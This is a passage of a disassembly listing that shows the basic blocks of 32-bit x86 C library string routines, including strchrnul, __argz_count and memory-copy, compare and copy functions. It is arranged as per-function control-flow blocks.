0xb07cd18:	call	0xb07cd1d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07cd1d
TOTAL BLOCKS :1
0xb07cd1d:	pop	edx
0xb07cd1e:	lea	ecx, dword ptr [edx + ecx*8 + 0xb]
0xb07cd22:	jmp	ecx
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07d0b0
TOTAL BLOCKS :18
0xb07d106:	shr	ecx, 1
0xb07d108:	jae	0xb07d10b
None
|
|
|
v
0xb07d0ca:	cmp	ecx, 3
0xb07d0cd:	jbe	0xb07d106
None
|
|
|
v
0xb07d0f6:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07d10b:	shr	ecx, 1
0xb07d10d:	jae	0xb07d111
None
|
|
|
v
0xb07d0d7:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07d0d8:	dec	ecx
0xb07d0d9:	test	esi, 3
0xb07d0df:	je	0xb07d0ed
None
|
|
|
v
0xb07d0fd:	mov	edi, eax
0xb07d0ff:	mov	esi, edx
0xb07d101:	mov	eax, dword ptr [esp + 4]
0xb07d105:	ret	
None
|
|
|
v
0xb07d10a:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07d10b:	shr	ecx, 1
0xb07d10d:	jae	0xb07d111
None
|
|
|
v
0xb07d0eb:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07d0ec:	dec	ecx
0xb07d0ed:	push	eax
0xb07d0ee:	mov	eax, ecx
0xb07d0f0:	shr	ecx, 2
0xb07d0f3:	and	eax, 3
0xb07d0f6:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07d0f8:	mov	ecx, eax
0xb07d0fa:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0xb07d111:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07d0e1:	movsb	byte ptr es:[edi], byte ptr [esi]
0xb07d0e2:	dec	ecx
0xb07d0e3:	test	esi, 3
0xb07d0e9:	je	0xb07d0ed
None
|
|
|
v
0xb07d113:	jmp	0xb07d0fd
None
|
|
|
v
0xb07d0cf:	test	esi, 3
0xb07d0d5:	je	0xb07d0ed
None
|
|
|
v
0xb07d0b0:	mov	eax, edi
0xb07d0b2:	mov	edi, dword ptr [esp + 4]
0xb07d0b6:	mov	edx, esi
0xb07d0b8:	mov	esi, dword ptr [esp + 8]
0xb07d0bc:	mov	ecx, edi
0xb07d0be:	xor	ecx, esi
0xb07d0c0:	and	ecx, 3
0xb07d0c3:	mov	ecx, dword ptr [esp + 0xc]
0xb07d0c7:	cld	
0xb07d0c8:	jne	0xb07d106
None
|
|
|
v
0xb07d0fc:	pop	eax
0xb07d0fd:	mov	edi, eax
0xb07d0ff:	mov	esi, edx
0xb07d101:	mov	eax, dword ptr [esp + 4]
0xb07d105:	ret	
None
|
|
|
v
0xb07d10f:	movsw	word ptr es:[edi], word ptr [esi]
0xb07d111:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0xb07d0fa:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0xb07d0ed:	push	eax
0xb07d0ee:	mov	eax, ecx
0xb07d0f0:	shr	ecx, 2
0xb07d0f3:	and	eax, 3
0xb07d0f6:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07ed60
TOTAL BLOCKS :24
0xb07eddf:	xor	edi, ecx
0xb07ede1:	or	edi, 0xfefefeff
0xb07ede7:	inc	edi
0xb07ede8:	jne	0xb07ee0b
None
|
|
|
v
0xb07ed91:	cmp	byte ptr [eax], dl
0xb07ed93:	je	0xb07ee24
None
|
|
|
v
0xb07ee08:	add	eax, 4
0xb07ee0b:	add	eax, 4
0xb07ee0e:	add	eax, 4
0xb07ee11:	test	cl, cl
0xb07ee13:	je	0xb07ee24
None
|
|
|
v
0xb07ed84:	cmp	byte ptr [eax], dl
0xb07ed86:	je	0xb07ee24
None
|
|
|
v
0xb07edc6:	xor	edi, ecx
0xb07edc8:	or	edi, 0xfefefeff
0xb07edce:	inc	edi
0xb07edcf:	jne	0xb07ee0e
None
|
|
|
v
0xb07ee0e:	add	eax, 4
0xb07ee11:	test	cl, cl
0xb07ee13:	je	0xb07ee24
None
|
|
|
v
0xb07ed7f:	inc	eax
0xb07ed80:	test	al, 3
0xb07ed82:	je	0xb07eda0
None
|
|
|
v
0xb07eda0:	mov	ecx, dword ptr [eax]
0xb07eda2:	mov	edi, 0xfefefeff
0xb07eda7:	xor	ecx, edx
0xb07eda9:	add	edi, ecx
0xb07edab:	jae	0xb07ee11
None
|
|
|
v
0xb07ed8c:	inc	eax
0xb07ed8d:	test	al, 3
0xb07ed8f:	je	0xb07eda0
None
|
|
|
v
0xb07ee0b:	add	eax, 4
0xb07ee0e:	add	eax, 4
0xb07ee11:	test	cl, cl
0xb07ee13:	je	0xb07ee24
None
|
|
|
v
0xb07ee15:	inc	eax
0xb07ee16:	test	ch, ch
0xb07ee18:	je	0xb07ee24
None
|
|
|
v
0xb07edf8:	xor	edi, ecx
0xb07edfa:	or	edi, 0xfefefeff
0xb07ee00:	inc	edi
0xb07ee01:	jne	0xb07ee08
None
|
|
|
v
0xb07ee03:	add	eax, 0x10
0xb07ee06:	jmp	0xb07eda0
None
|
|
|
v
0xb07ed60:	push	edi
0xb07ed61:	mov	eax, dword ptr [esp + 8]
0xb07ed65:	mov	edx, dword ptr [esp + 0xc]
0xb07ed69:	mov	dh, dl
0xb07ed6b:	mov	ecx, edx
0xb07ed6d:	shl	edx, 0x10
0xb07ed70:	mov	dx, cx
0xb07ed73:	test	al, 3
0xb07ed75:	je	0xb07eda0
None
|
|
|
v
0xb07ee23:	inc	eax
0xb07ee24:	pop	edi
0xb07ee25:	ret	
None
|
|
|
v
0xb07ee1a:	inc	eax
0xb07ee1b:	test	ecx, 0xff0000
0xb07ee21:	je	0xb07ee24
None
|
|
|
v
0xb07edb8:	mov	ecx, dword ptr [eax + 4]
0xb07edbb:	mov	edi, 0xfefefeff
0xb07edc0:	xor	ecx, edx
0xb07edc2:	add	edi, ecx
0xb07edc4:	jae	0xb07ee0e
None
|
|
|
v
0xb07edea:	mov	ecx, dword ptr [eax + 0xc]
0xb07eded:	mov	edi, 0xfefefeff
0xb07edf2:	xor	ecx, edx
0xb07edf4:	add	edi, ecx
0xb07edf6:	jae	0xb07ee08
None
|
|
|
v
0xb07ee11:	test	cl, cl
0xb07ee13:	je	0xb07ee24
None
|
|
|
v
0xb07edad:	xor	edi, ecx
0xb07edaf:	or	edi, 0xfefefeff
0xb07edb5:	inc	edi
0xb07edb6:	jne	0xb07ee11
None
|
|
|
v
0xb07ed77:	cmp	byte ptr [eax], dl
0xb07ed79:	je	0xb07ee24
None
|
|
|
v
0xb07ed99:	inc	eax
0xb07ed9a:	lea	esi, dword ptr [esi]
0xb07eda0:	mov	ecx, dword ptr [eax]
0xb07eda2:	mov	edi, 0xfefefeff
0xb07eda7:	xor	ecx, edx
0xb07eda9:	add	edi, ecx
0xb07edab:	jae	0xb07ee11
None
|
|
|
v
0xb07ee24:	pop	edi
0xb07ee25:	ret	
None
|
|
|
v
0xb07edd1:	mov	ecx, dword ptr [eax + 8]
0xb07edd4:	mov	edi, 0xfefefeff
0xb07edd9:	xor	ecx, edx
0xb07eddb:	add	edi, ecx
0xb07eddd:	jae	0xb07ee0b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strchrnul
TOTAL BLOCKS :38
0xb07ee87:	inc	eax
0xb07ee88:	jmp	0xb07ee93
None
|
|
|
v
0xb07ee7f:	test	cl, cl
0xb07ee81:	je	0xb07ef8d
None
|
|
|
v
0xb07eea4:	xor	edi, ecx
0xb07eea6:	or	edi, 0xfefefeff
0xb07eeac:	inc	edi
0xb07eead:	jne	0xb07ef6f
None
|
|
|
v
0xb07ee5e:	mov	cl, byte ptr [eax]
0xb07ee60:	cmp	dl, cl
0xb07ee62:	je	0xb07ef8d
None
|
|
|
v
0xb07ef4c:	xor	ecx, edx
0xb07ef4e:	mov	edi, 0xfefefeff
0xb07ef53:	add	edi, ecx
0xb07ef55:	jae	0xb07ef66
None
|
|
|
v
0xb07ef6f:	test	cl, cl
0xb07ef71:	je	0xb07ef8d
None
|
|
|
v
0xb07ee70:	inc	eax
0xb07ee71:	test	al, 3
0xb07ee73:	je	0xb07ee93
None
|
|
|
v
0xb07eed1:	mov	ecx, dword ptr [eax + 4]
0xb07eed4:	xor	ecx, edx
0xb07eed6:	mov	edi, 0xfefefeff
0xb07eedb:	add	edi, ecx
0xb07eedd:	jae	0xb07ef6c
None
|
|
|
v
0xb07eef9:	xor	edi, ecx
0xb07eefb:	or	edi, 0xfefefeff
0xb07ef01:	inc	edi
0xb07ef02:	jne	0xb07ef6c
None
|
|
|
v
0xb07ef6c:	add	eax, 4
0xb07ef6f:	test	cl, cl
0xb07ef71:	je	0xb07ef8d
None
|
|
|
v
0xb07ef69:	add	eax, 4
0xb07ef6c:	add	eax, 4
0xb07ef6f:	test	cl, cl
0xb07ef71:	je	0xb07ef8d
None
|
|
|
v
0xb07eeb3:	xor	ecx, edx
0xb07eeb5:	mov	edi, 0xfefefeff
0xb07eeba:	add	edi, ecx
0xb07eebc:	jae	0xb07ef6f
None
|
|
|
v
0xb07eec2:	xor	edi, ecx
0xb07eec4:	or	edi, 0xfefefeff
0xb07eeca:	inc	edi
0xb07eecb:	jne	0xb07ef6f
None
|
|
|
v
0xb07ef8c:	inc	eax
0xb07ef8d:	pop	edi
0xb07ef8e:	ret	
None
|
|
|
v
0xb07eeee:	xor	ecx, edx
0xb07eef0:	mov	edi, 0xfefefeff
0xb07eef5:	add	edi, ecx
0xb07eef7:	jae	0xb07ef6c
None
|
|
|
v
0xb07ee51:	test	cl, cl
0xb07ee53:	je	0xb07ef8d
None
|
|
|
v
0xb07ef77:	inc	eax
0xb07ef78:	test	ch, ch
0xb07ef7a:	je	0xb07ef8d
None
|
|
|
v
0xb07ef8d:	pop	edi
0xb07ef8e:	ret	
None
|
|
|
v
0xb07ee59:	inc	eax
0xb07ee5a:	test	al, 3
0xb07ee5c:	je	0xb07ee93
None
|
|
|
v
0xb07ee93:	mov	ecx, dword ptr [eax]
0xb07ee95:	xor	ecx, edx
0xb07ee97:	mov	edi, 0xfefefeff
0xb07ee9c:	add	edi, ecx
0xb07ee9e:	jae	0xb07ef6f
None
|
|
|
v
0xb07ef04:	mov	ecx, dword ptr [eax + 8]
0xb07ef07:	xor	ecx, edx
0xb07ef09:	mov	edi, 0xfefefeff
0xb07ef0e:	add	edi, ecx
0xb07ef10:	jae	0xb07ef69
None
|
|
|
v
0xb07ef33:	mov	ecx, dword ptr [eax + 0xc]
0xb07ef36:	xor	ecx, edx
0xb07ef38:	mov	edi, 0xfefefeff
0xb07ef3d:	add	edi, ecx
0xb07ef3f:	jae	0xb07ef66
None
|
|
|
v
0xb07ef1d:	xor	ecx, edx
0xb07ef1f:	mov	edi, 0xfefefeff
0xb07ef24:	add	edi, ecx
0xb07ef26:	jae	0xb07ef69
None
|
|
|
v
0xb07ee68:	test	cl, cl
0xb07ee6a:	je	0xb07ef8d
None
|
|
|
v
0xb07ee75:	mov	cl, byte ptr [eax]
0xb07ee77:	cmp	dl, cl
0xb07ee79:	je	0xb07ef8d
None
|
|
|
v
0xb07ef66:	add	eax, 4
0xb07ef69:	add	eax, 4
0xb07ef6c:	add	eax, 4
0xb07ef6f:	test	cl, cl
0xb07ef71:	je	0xb07ef8d
None
|
|
|
v
0xb07ef41:	xor	edi, ecx
0xb07ef43:	or	edi, 0xfefefeff
0xb07ef49:	inc	edi
0xb07ef4a:	jne	0xb07ef66
None
|
|
|
v
0xb07ef80:	inc	eax
0xb07ef81:	shr	ecx, 0x10
0xb07ef84:	test	cl, cl
0xb07ef86:	je	0xb07ef8d
None
|
|
|
v
0xb07ef7c:	cmp	ch, dl
0xb07ef7e:	je	0xb07ef8d
None
|
|
|
v
0xb07ef28:	xor	edi, ecx
0xb07ef2a:	or	edi, 0xfefefeff
0xb07ef30:	inc	edi
0xb07ef31:	jne	0xb07ef69
None
|
|
|
v
0xb07ef73:	cmp	cl, dl
0xb07ef75:	je	0xb07ef8d
None
|
|
|
v
0xb07eee3:	xor	edi, ecx
0xb07eee5:	or	edi, 0xfefefeff
0xb07eeeb:	inc	edi
0xb07eeec:	jne	0xb07ef6c
None
|
|
|
v
0xb07ee30:	push	edi
0xb07ee31:	mov	eax, dword ptr [esp + 8]
0xb07ee35:	mov	edx, dword ptr [esp + 0xc]
0xb07ee39:	mov	dh, dl
0xb07ee3b:	mov	ecx, edx
0xb07ee3d:	shl	edx, 0x10
0xb07ee40:	mov	dx, cx
0xb07ee43:	test	al, 3
0xb07ee45:	je	0xb07ee93
None
|
|
|
v
0xb07ef57:	xor	edi, ecx
0xb07ef59:	or	edi, 0xfefefeff
0xb07ef5f:	inc	edi
0xb07ef60:	je	0xb07ee90
None
|
|
|
v
0xb07ee47:	mov	cl, byte ptr [eax]
0xb07ee49:	cmp	dl, cl
0xb07ee4b:	je	0xb07ef8d
None
|
|
|
v
0xb07ee90:	add	eax, 0x10
0xb07ee93:	mov	ecx, dword ptr [eax]
0xb07ee95:	xor	ecx, edx
0xb07ee97:	mov	edi, 0xfefefeff
0xb07ee9c:	add	edi, ecx
0xb07ee9e:	jae	0xb07ef6f
None
|
|
|
v
0xb07ef12:	xor	edi, ecx
0xb07ef14:	or	edi, 0xfefefeff
0xb07ef1a:	inc	edi
0xb07ef1b:	jne	0xb07ef69
None
|
|
|
v
0xb07ef88:	cmp	cl, dl
0xb07ef8a:	je	0xb07ef8d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__argz_count
TOTAL BLOCKS :5
0xb07f073:	mov	edx, ebp
0xb07f075:	sub	edx, eax
0xb07f077:	sub	edx, 1
0xb07f07a:	lea	esi, dword ptr [esi + eax + 1]
0xb07f07e:	mov	ebp, edx
0xb07f080:	jne	0xb07f068
None
|
|
|
v
0xb07f068:	mov	dword ptr [esp], esi
0xb07f06b:	add	edi, 1
0xb07f06e:	call	0xb07ae80
None
|
|
|
v
0xb07f064:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb07f082:	add	esp, 0x10
0xb07f085:	mov	eax, edi
0xb07f087:	pop	esi
0xb07f088:	pop	edi
0xb07f089:	pop	ebp
0xb07f08a:	ret	
None
|
|
|
v
0xb07f050:	push	ebp
0xb07f051:	push	edi
0xb07f052:	xor	edi, edi
0xb07f054:	push	esi
0xb07f055:	sub	esp, 0x10
0xb07f058:	mov	ebp, dword ptr [esp + 0x24]
0xb07f05c:	mov	esi, dword ptr [esp + 0x20]
0xb07f060:	test	ebp, ebp
0xb07f062:	je	0xb07f082
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__argz_stringify
TOTAL BLOCKS :7
0xb07f498:	mov	eax, ebp
0xb07f49a:	lea	edi, dword ptr [edx + 1]
0xb07f49d:	mov	byte ptr [edx], al
0xb07f49f:	mov	dword ptr [esp + 4], esi
0xb07f4a3:	mov	dword ptr [esp], edi
0xb07f4a6:	call	0xb017480
None
|
|
|
v
0xb07f470:	push	ebp
0xb07f471:	push	edi
0xb07f472:	push	esi
0xb07f473:	push	ebx
0xb07f474:	sub	esp, 0x1c
0xb07f477:	mov	esi, dword ptr [esp + 0x34]
0xb07f47b:	call	0xb1267db
None
|
|
|
v
0xb07f492:	jmp	0xb07f4ba
None
|
|
|
v
0xb07f480:	add	ebx, 0x12bb80
0xb07f486:	mov	edi, dword ptr [esp + 0x30]
0xb07f48a:	mov	ebp, dword ptr [esp + 0x38]
0xb07f48e:	test	esi, esi
0xb07f490:	jne	0xb07f49f
None
|
|
|
v
0xb07f49f:	mov	dword ptr [esp + 4], esi
0xb07f4a3:	mov	dword ptr [esp], edi
0xb07f4a6:	call	0xb017480
None
|
|
|
v
0xb07f4ba:	add	esp, 0x1c
0xb07f4bd:	pop	ebx
0xb07f4be:	pop	esi
0xb07f4bf:	pop	edi
0xb07f4c0:	pop	ebp
0xb07f4c1:	ret	
None
|
|
|
v
0xb07f4ab:	sub	esi, eax
0xb07f4ad:	lea	edx, dword ptr [edi + eax]
0xb07f4b0:	mov	eax, esi
0xb07f4b2:	cmp	eax, 1
0xb07f4b5:	lea	esi, dword ptr [esi - 1]
0xb07f4b8:	ja	0xb07f498
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b082ed0
TOTAL BLOCKS :23
0xb082f1c:	test	al, al
0xb082f1e:	je	0xb082f58
None
|
|
|
v
0xb082fa7:	test	al, al
0xb082fa9:	je	0xb082f58
None
|
|
|
v
0xb082fc0:	and	ebp, 3
0xb082fc3:	jmp	0xb082f6c
None
|
|
|
v
0xb082f57:	nop	
None
|
|
|
v
0xb082ef4:	mov	eax, dword ptr [esp + 0x10]
0xb082ef8:	movzx	edi, byte ptr [ecx + 1]
0xb082efc:	movzx	eax, byte ptr [eax + 1]
0xb082f00:	mov	edx, edi
0xb082f02:	cmp	al, dl
0xb082f04:	jne	0xb082f58
None
|
|
|
v
0xb082f58:	mov	ecx, edi
0xb082f5a:	movzx	edi, cl
0xb082f5d:	sub	eax, edi
0xb082f5f:	pop	esi
0xb082f60:	pop	edi
0xb082f61:	pop	ebp
0xb082f62:	ret	
None
|
|
|
v
0xb082ef0:	test	al, al
0xb082ef2:	je	0xb082f58
None
|
|
|
v
0xb082f0a:	mov	eax, dword ptr [esp + 0x10]
0xb082f0e:	movzx	edi, byte ptr [ecx + 2]
0xb082f12:	movzx	eax, byte ptr [eax + 2]
0xb082f16:	mov	edx, edi
0xb082f18:	cmp	al, dl
0xb082f1a:	jne	0xb082f58
None
|
|
|
v
0xb082ed0:	push	ebp
0xb082ed1:	push	edi
0xb082ed2:	push	esi
0xb082ed3:	mov	ebp, dword ptr [esp + 0x18]
0xb082ed7:	mov	ecx, dword ptr [esp + 0x14]
0xb082edb:	cmp	ebp, 3
0xb082ede:	jbe	0xb082f68
None
|
|
|
v
0xb082f3e:	test	al, al
0xb082f40:	je	0xb082f58
None
|
|
|
v
0xb082f06:	test	al, al
0xb082f08:	je	0xb082f58
None
|
|
|
v
0xb082f90:	mov	eax, dword ptr [esp + 0x10]
0xb082f94:	movzx	edi, byte ptr [ecx + esi + 1]
0xb082f99:	movzx	eax, byte ptr [eax + esi + 1]
0xb082f9e:	add	esi, 1
0xb082fa1:	mov	edx, edi
0xb082fa3:	cmp	al, dl
0xb082fa5:	jne	0xb082f58
None
|
|
|
v
0xb082faf:	mov	ecx, edi
0xb082fb1:	movzx	edi, cl
0xb082fb4:	sub	eax, edi
0xb082fb6:	pop	esi
0xb082fb7:	pop	edi
0xb082fb8:	pop	ebp
0xb082fb9:	ret	
None
|
|
|
v
0xb082f68:	xor	edi, edi
0xb082f6a:	xor	eax, eax
0xb082f6c:	test	ebp, ebp
0xb082f6e:	je	0xb082f58
None
|
|
|
v
0xb082f47:	mov	eax, dword ptr [esp + 0x10]
0xb082f4b:	movzx	edi, byte ptr [ecx]
0xb082f4e:	movzx	eax, byte ptr [eax]
0xb082f51:	mov	edx, edi
0xb082f53:	cmp	al, dl
0xb082f55:	je	0xb082ef0
None
|
|
|
v
0xb082f42:	sub	esi, 1
0xb082f45:	je	0xb082fc0
None
|
|
|
v
0xb082ee4:	mov	esi, ebp
0xb082ee6:	shr	esi, 2
0xb082ee9:	jmp	0xb082f47
None
|
|
|
v
0xb082f70:	mov	eax, dword ptr [esp + 0x10]
0xb082f74:	movzx	edi, byte ptr [ecx]
0xb082f77:	movzx	eax, byte ptr [eax]
0xb082f7a:	mov	edx, edi
0xb082f7c:	cmp	al, dl
0xb082f7e:	jne	0xb082f58
None
|
|
|
v
0xb082fab:	cmp	esi, ebp
0xb082fad:	jne	0xb082f90
None
|
|
|
v
0xb082f89:	jmp	0xb082f58
None
|
|
|
v
0xb082f6c:	test	ebp, ebp
0xb082f6e:	je	0xb082f58
None
|
|
|
v
0xb082f80:	sub	ebp, 1
0xb082f83:	xor	esi, esi
0xb082f85:	test	al, al
0xb082f87:	jne	0xb082fab
None
|
|
|
v
0xb082f20:	mov	eax, dword ptr [esp + 0x10]
0xb082f24:	lea	edi, dword ptr [ecx + 4]
0xb082f27:	mov	ecx, edi
0xb082f29:	movzx	edi, byte ptr [edi - 1]
0xb082f2d:	add	eax, 4
0xb082f30:	mov	dword ptr [esp + 0x10], eax
0xb082f34:	movzx	eax, byte ptr [eax - 1]
0xb082f38:	mov	edx, edi
0xb082f3a:	cmp	al, dl
0xb082f3c:	jne	0xb082f58
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0830a0
TOTAL BLOCKS :22
0xb08318b:	jmp	0xb083122
None
|
|
|
v
0xb0830de:	lea	eax, dword ptr [ecx + 4]
0xb0830e1:	mov	ecx, eax
0xb0830e3:	movzx	eax, byte ptr [eax - 1]
0xb0830e7:	lea	edi, dword ptr [edx + 4]
0xb0830ea:	mov	edx, edi
0xb0830ec:	test	al, al
0xb0830ee:	mov	byte ptr [edi], al
0xb0830f0:	je	0xb083104
None
|
|
|
v
0xb0830f2:	sub	esi, 1
0xb0830f5:	je	0xb083128
None
|
|
|
v
0xb083178:	mov	edi, dword ptr [esp + 0x18]
0xb08317c:	add	edx, 3
0xb08317f:	mov	eax, ebp
0xb083181:	sub	eax, edx
0xb083183:	lea	eax, dword ptr [edi + eax - 1]
0xb083187:	test	eax, eax
0xb083189:	jne	0xb083114
None
|
|
|
v
0xb0830f7:	movzx	eax, byte ptr [ecx]
0xb0830fa:	test	al, al
0xb0830fc:	mov	byte ptr [edx + 1], al
0xb0830ff:	jne	0xb0830c0
None
|
|
|
v
0xb083138:	test	al, al
0xb08313a:	je	0xb083158
None
|
|
|
v
0xb083128:	mov	eax, dword ptr [esp + 0x18]
0xb08312c:	and	eax, 3
0xb08312f:	je	0xb083122
None
|
|
|
v
0xb0830b5:	mov	esi, dword ptr [esp + 0x18]
0xb0830b9:	shr	esi, 2
0xb0830bc:	jmp	0xb0830f7
None
|
|
|
v
0xb083173:	jmp	0xb083122
None
|
|
|
v
0xb083118:	add	edx, 1
0xb08311b:	cmp	edx, eax
0xb08311d:	mov	byte ptr [edx], 0
0xb083120:	jne	0xb083118
None
|
|
|
v
0xb08313c:	add	ecx, 1
0xb08313f:	movzx	esi, byte ptr [ecx - 1]
0xb083143:	add	edx, 1
0xb083146:	sub	edi, 1
0xb083149:	mov	eax, esi
0xb08314b:	mov	byte ptr [edx], al
0xb08314d:	jne	0xb083138
None
|
|
|
v
0xb0830a0:	push	ebp
0xb0830a1:	push	edi
0xb0830a2:	push	esi
0xb0830a3:	mov	ebp, dword ptr [esp + 0x10]
0xb0830a7:	cmp	dword ptr [esp + 0x18], 3
0xb0830ac:	mov	ecx, dword ptr [esp + 0x14]
0xb0830b0:	lea	edx, dword ptr [ebp - 1]
0xb0830b3:	jbe	0xb083128
None
|
|
|
v
0xb083160:	mov	edi, dword ptr [esp + 0x18]
0xb083164:	add	edx, 2
0xb083167:	mov	eax, ebp
0xb083169:	sub	eax, edx
0xb08316b:	lea	eax, dword ptr [edi + eax - 1]
0xb08316f:	test	eax, eax
0xb083171:	jne	0xb083114
None
|
|
|
v
0xb083104:	mov	edi, dword ptr [esp + 0x18]
0xb083108:	mov	eax, ebp
0xb08310a:	sub	eax, edx
0xb08310c:	lea	eax, dword ptr [edi + eax - 1]
0xb083110:	test	eax, eax
0xb083112:	je	0xb083122
None
|
|
|
v
0xb083101:	add	edx, 1
0xb083104:	mov	edi, dword ptr [esp + 0x18]
0xb083108:	mov	eax, ebp
0xb08310a:	sub	eax, edx
0xb08310c:	lea	eax, dword ptr [edi + eax - 1]
0xb083110:	test	eax, eax
0xb083112:	je	0xb083122
None
|
|
|
v
0xb083158:	mov	eax, edi
0xb08315a:	jmp	0xb083114
None
|
|
|
v
0xb083114:	add	eax, edx
0xb083116:	nop	
0xb083118:	add	edx, 1
0xb08311b:	cmp	edx, eax
0xb08311d:	mov	byte ptr [edx], 0
0xb083120:	jne	0xb083118
None
|
|
|
v
0xb083122:	mov	eax, ebp
0xb083124:	pop	esi
0xb083125:	pop	edi
0xb083126:	pop	ebp
0xb083127:	ret	
None
|
|
|
v
0xb08314f:	jmp	0xb083122
None
|
|
|
v
0xb0830c0:	movzx	eax, byte ptr [ecx + 1]
0xb0830c4:	test	al, al
0xb0830c6:	mov	byte ptr [edx + 2], al
0xb0830c9:	je	0xb083160
None
|
|
|
v
0xb0830cf:	movzx	eax, byte ptr [ecx + 2]
0xb0830d3:	test	al, al
0xb0830d5:	mov	byte ptr [edx + 3], al
0xb0830d8:	je	0xb083178
None
|
|
|
v
0xb083131:	mov	edi, eax
0xb083133:	jmp	0xb08313c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b094e70
TOTAL BLOCKS :6
0xb094eb0:	pop	esi
0xb094eb1:	xor	eax, eax
0xb094eb3:	pop	edi
0xb094eb4:	pop	ebp
0xb094eb5:	ret	
None
|
|
|
v
0xb094e7f:	mov	eax, dword ptr [esp + 0x18]
0xb094e83:	mov	esi, dword ptr [eax + 0x38]
0xb094e86:	jmp	0xb094e91
None
|
|
|
v
0xb094e88:	mov	eax, ebp
0xb094e8a:	add	ecx, 1
0xb094e8d:	test	al, al
0xb094e8f:	je	0xb094eb0
None
|
|
|
v
0xb094e70:	push	ebp
0xb094e71:	push	edi
0xb094e72:	push	esi
0xb094e73:	mov	ecx, dword ptr [esp + 0x10]
0xb094e77:	mov	edx, dword ptr [esp + 0x14]
0xb094e7b:	cmp	ecx, edx
0xb094e7d:	je	0xb094eb0
None
|
|
|
v
0xb094e91:	movzx	ebp, byte ptr [ecx]
0xb094e94:	add	edx, 1
0xb094e97:	mov	eax, ebp
0xb094e99:	movzx	edi, al
0xb094e9c:	movzx	eax, byte ptr [edx - 1]
0xb094ea0:	mov	edi, dword ptr [esi + edi*4]
0xb094ea3:	sub	edi, dword ptr [esi + eax*4]
0xb094ea6:	je	0xb094e88
None
|
|
|
v
0xb094ea8:	mov	eax, edi
0xb094eaa:	pop	esi
0xb094eab:	pop	edi
0xb094eac:	pop	ebp
0xb094ead:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b094ec0
TOTAL BLOCKS :7
0xb094ed4:	add	ebx, 0x11612c
0xb094eda:	mov	edx, dword ptr [esp + 0x18]
0xb094ede:	cmp	ecx, edx
0xb094ee0:	mov	eax, dword ptr [ebx - 0x134]
0xb094ee6:	mov	eax, dword ptr [esi + eax]
0xb094ee9:	je	0xb094f18
None
|
|
|
v
0xb094f18:	pop	ebx
0xb094f19:	xor	eax, eax
0xb094f1b:	pop	esi
0xb094f1c:	pop	edi
0xb094f1d:	pop	ebp
0xb094f1e:	ret	
None
|
|
|
v
0xb094eeb:	mov	esi, dword ptr [eax + 0x38]
0xb094eee:	jmp	0xb094ef9
None
|
|
|
v
0xb094ef0:	mov	eax, ebp
0xb094ef2:	add	ecx, 1
0xb094ef5:	test	al, al
0xb094ef7:	je	0xb094f18
None
|
|
|
v
0xb094ec0:	push	ebp
0xb094ec1:	push	edi
0xb094ec2:	push	esi
0xb094ec3:	mov	esi, dword ptr gs:[0]
0xb094eca:	push	ebx
0xb094ecb:	mov	ecx, dword ptr [esp + 0x14]
0xb094ecf:	call	0xb1267db
None
|
|
|
v
0xb094f10:	pop	ebx
0xb094f11:	mov	eax, edi
0xb094f13:	pop	esi
0xb094f14:	pop	edi
0xb094f15:	pop	ebp
0xb094f16:	ret	
None
|
|
|
v
0xb094ef9:	movzx	ebp, byte ptr [ecx]
0xb094efc:	add	edx, 1
0xb094eff:	mov	eax, ebp
0xb094f01:	movzx	edi, al
0xb094f04:	movzx	eax, byte ptr [edx - 1]
0xb094f08:	mov	edi, dword ptr [esi + edi*4]
0xb094f0b:	sub	edi, dword ptr [esi + eax*4]
0xb094f0e:	je	0xb094ef0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b095000
TOTAL BLOCKS :61
0xb095178:	cmp	eax, 1
0xb09517b:	je	0xb0952b8
None
|
|
|
v
0xb09525f:	mov	eax, dword ptr [ecx + 4]
0xb095262:	add	esp, 0x2c
0xb095265:	pop	ebx
0xb095266:	pop	esi
0xb095267:	pop	edi
0xb095268:	pop	ebp
0xb095269:	ret	
None
|
|
|
v
0xb0950d9:	add	eax, 1
0xb0950dc:	cmp	ebp, eax
0xb0950de:	mov	dword ptr [esp + 0x10], eax
0xb0950e2:	ja	0xb0950b8
None
|
|
|
v
0xb0951d2:	add	ebp, 1
0xb0951d5:	mov	eax, 4
0xb0951da:	mov	ecx, ebp
0xb0951dc:	xchg	edi, ebx
0xb0951de:	cpuid	
0xb0951e0:	xchg	edi, ebx
0xb0951e2:	mov	edx, eax
0xb0951e4:	and	edx, 0x1f
0xb0951e7:	mov	dword ptr [esp + 0x18], edi
0xb0951eb:	mov	dword ptr [esp + 0x10], edx
0xb0951ef:	je	0xb0950f5
None
|
|
|
v
0xb09510d:	cmp	al, 6
0xb09510f:	jne	0xb0950e4
None
|
|
|
v
0xb095129:	jmp	0xb0950f5
None
|
|
|
v
0xb0950f7:	add	esp, 0x2c
0xb0950fa:	pop	ebx
0xb0950fb:	pop	esi
0xb0950fc:	pop	edi
0xb0950fd:	pop	ebp
